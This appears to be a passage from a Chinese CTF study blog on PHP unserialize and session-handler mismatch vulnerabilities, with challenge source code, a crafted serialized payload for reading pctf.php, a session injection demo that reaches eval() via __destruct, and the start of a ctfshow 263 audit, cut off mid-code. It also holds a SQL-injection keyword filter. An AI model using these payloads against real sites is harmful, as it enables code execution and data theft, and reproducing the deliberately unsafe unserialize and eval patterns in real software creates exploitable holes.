class="hljs-string">&#x27;..&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;\\&#x27;</span>)===<span class="hljs-literal">FALSE</span><br>&amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;pctf&#x27;</span>)===<span class="hljs-literal">FALSE</span>) &#123;<br>readfile(<span class="hljs-variable">$f</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;shield.php&#x27;</span>;<br>    <span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> Shield();<br>    <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$g</span>)) &#123;<br>        <span class="hljs-variable">$x</span> = unserialize(<span class="hljs-variable">$g</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span> - readfile();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//shield.php</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接这样读取 pctf.php 返回 file not found</p><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Shield(pctf.php);<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>index.php?class=O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}</p></blockquote><h2 id="PHP-session-反序列化"><a href="#PHP-session-反序列化" class="headerlink" title="PHP session 反序列化"></a>PHP session 反序列化</h2><blockquote><p>当 session_start()被调用或者 php.ini 中 session.auto_start = 1 时，PHP 内部调用会话管理器，将用户 session 序列化以后，存储到指定目录（默认为/tmp）</p></blockquote><h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/10/.png"></p><h3 id="ini-中相关的配置"><a href="#ini-中相关的配置" class="headerlink" title="ini 中相关的配置"></a>ini 中相关的配置</h3><p>配置文件 php.ini 中含有 session 的相关配置</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.save_path=&quot;&quot;   <span class="hljs-comment">--设置session的存储路径,默认在/tmp</span><br><span class="hljs-keyword">session</span>.auto_start   <span class="hljs-comment">--指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="hljs-keyword">session</span>.serialize_handler   <span class="hljs-comment">--定义用来序列化/反序列化的处理器名字。默认使用phpsession.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)，比如files就是session默认以文件的方式进行存储</span><br></code></pre></td></tr></table></figure><h3 id="代码中引擎设置"><a href="#代码中引擎设置" class="headerlink" title="代码中引擎设置"></a>代码中引擎设置</h3><p>在 PHP 中默认使用的是 PHP 引擎，如果要修改为其他的引擎，只需要添加代码</p><p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br></code></pre></td></tr></table></figure><h3 id="不同引擎存储差异"><a href="#不同引擎存储差异" class="headerlink" title="不同引擎存储差异"></a>不同引擎存储差异</h3><p>php 中的 session 内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为 session 序列化后的值，文件位置在 ini 的<code>session.save_path</code>中 <strong>phpstudy 本地位置：/Extensions/tmp/tmp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>当<code>session.serialize_handler</code>为<code>php</code>时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure><ul><li>当<code>session.serialize_handler</code>为<code>php_serialize</code>时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li>当<code>session.serialize_handler</code>为<code>php_binary</code>时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;<span class="hljs-number">0x04</span>&gt;names:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>PHP 中的 Session 的实现是没有的问题，危害主要是由于程序员的 Session 使用不当而引起的。如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据。常见的比如存入 session 时用的处理器为 php_serialize,反序列化时用的处理器是 php</p><p><strong>php 大于 5.5.4 的版本中默认使用 php_serialize 规则</strong></p><p>常见的比如存入 session 时用的处理器为 php_serialize，反序列化时用的处理器是 php</p><blockquote><p>当配置选项 session.auto_start ＝ Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题</p><p>当配置选项 session.auto_start ＝ On 会自动注册 Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start ＝ On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start()函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题,因为 PHP 自动注册 Session 会话是在脚本执行前，所以通过该方式只能注入 PHP 的内置类</p></blockquote><p>比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ryat&#x27;</span>] = <span class="hljs-string">&#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>上面的$_SESSION 数据 在存储时使用的序列化处理器为 php_serialize 存储的格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ryat&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;|O:8:&quot;</span><span class="hljs-built_in">stdClass</span><span class="hljs-string">&quot;:0:&#123;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>在读取数据时如果用的反序列化处理器不是 php_serialize 而是 php 的话 那么反序列化后的数据将会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!php</span><br><span class="hljs-comment">// var_dump($_SESSION);</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;a:1:&#123;s:4:&quot;</span>ryat<span class="hljs-string">&quot;;s:20:&quot;</span><span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  object(stdClass)#1 (0) &#123;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>则反序列化后还原得到一个新的对象 通过注入 <code>|</code> 字符伪造了对象的序列化数据</p><h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s1.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;spoock&quot;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s2.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hi = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;hi);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先访问一下 s2 应为空</p><p>接着访问<code>s1.php?a=|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code></p><p>然后访问一下 s2 回显 spoock，传入的数据会按照<strong>php_serialize</strong>来进行序列化。 此时访问 us2.php 时，页面输出，<code>spoock</code>成功执行了我们构造的函数。因为在访问 us2.php 时，程序会按照<strong>php</strong>来反序列化 SESSION 中的数据，实例化 lemon 对象，session 反序列化会执行里面销毁前的魔术函数<code>__destruct()</code>，前面的<code>__construct()</code>就不再执行了。</p><h3 id="题"><a href="#题" class="headerlink" title="题"></a>题</h3><h4 id="ctfshow-1"><a href="#ctfshow-1" class="headerlink" title="ctfshow"></a>ctfshow</h4><ul><li>ctfshow263</li></ul><p>下载源码，代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-comment">//超过5次禁止登陆</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limti&#x27;</span>]&gt;<span class="hljs-number">5</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;登陆失败次数超过限制&quot;</span>):<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]=base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]) +<span class="hljs-number">1</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> setcookie(<span class="hljs-string">&quot;limit&quot;</span>,base64_encode(<span class="hljs-string">&#x27;1&#x27;</span>));<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意此处有</p><blockquote><p>session_start();</p><p>这个审计下来五次登录错误就禁止了，但仔细一看<code>$_SESSION[&#39;limti&#39;]&gt;5</code>拼写有误，就是吓人的，下面两行代码必定执行</p><p>$_SESSION[‘limit’]=base64_decode($_COOKIE[‘limit’]);</p><p>$_COOKIE[‘limit’] = base64_encode(base64_decode($_COOKIE[‘limit’]) +1);</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//check.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;inc/inc.php&#x27;</span>;<br><span class="hljs-variable">$GET</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;u&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<span class="hljs-string">&quot;pass&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$GET</span>)&#123;<br><span class="hljs-variable">$data</span>= <span class="hljs-variable">$db</span>-&gt;get(<span class="hljs-string">&#x27;admin&#x27;</span>,<br>[<span class="hljs-string">&#x27;id&#x27;</span>,<br><span class="hljs-string">&#x27;UserName0&#x27;</span><br>],[<br><span class="hljs-string">&quot;AND&quot;</span>=&gt;[<br><span class="hljs-string">&quot;UserName0[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<br><span class="hljs-string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>] <span class="hljs-comment">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span><br>]<br>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&#123;<br><span class="hljs-comment">//登陆成功取消次数累计</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;欢迎您&quot;</span>.<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;UserName0&#x27;</span>]));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//登陆失败累计次数加1</span><br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>])+<span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;登陆失败&quot;</span>));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里不可能会登录成功，下面代码也必定执行</p><p>$_COOKIE[‘limit’] = base64_encode(base64_decode($_COOKIE[‘limit’])+1);<br>echo json_encode(array(“error”,”msg”=&gt;”登陆失败”));</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//inc.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<br>session_start();<br><span class="hljs-keyword">use</span> \<span class="hljs-title">CTFSHOW</span>\<span class="hljs-title">CTFSHOW</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;CTFSHOW.php&#x27;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> CTFSHOW([<br>    <span class="hljs-string">&#x27;database_type&#x27;</span> =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>    <span class="hljs-string">&#x27;database_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;web&#x27;</span>,<br>    <span class="hljs-string">&#x27;server&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-string">&#x27;charset&#x27;</span> =&gt; <span class="hljs-string">&#x27;utf8&#x27;</span>,<br>    <span class="hljs-string">&#x27;port&#x27;</span> =&gt; <span class="hljs-number">3306</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;option&#x27;</span> =&gt; [<br>        PDO::ATTR_CASE =&gt; PDO::CASE_NATURAL<br>    ]<br>]);<br><span class="hljs-comment">// sql注入检查</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkForm</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="hljs-variable">$str</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setStatus</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;status=<span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        file_put_contents(<span class="hljs-string">&quot;log-&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;username, <span class="hljs-string">&quot;使用&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;password.<span class="hljs-string">&quot;登陆&quot;</span>.(<span class="hljs-keyword">$this</span>-&gt;status?<span class="hljs-string">&quot;成功&quot;</span>:<span class="hljs-string">&quot;失败&quot;</span>).<span class="hljs-string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>));<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*生成唯一标志</span><br><span class="hljs-comment">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$chars</span> = md5(uniqid(mt_rand(), <span class="hljs-literal">true</span>));<br>    <span class="hljs-variable">$uuid</span> = substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span> ) . 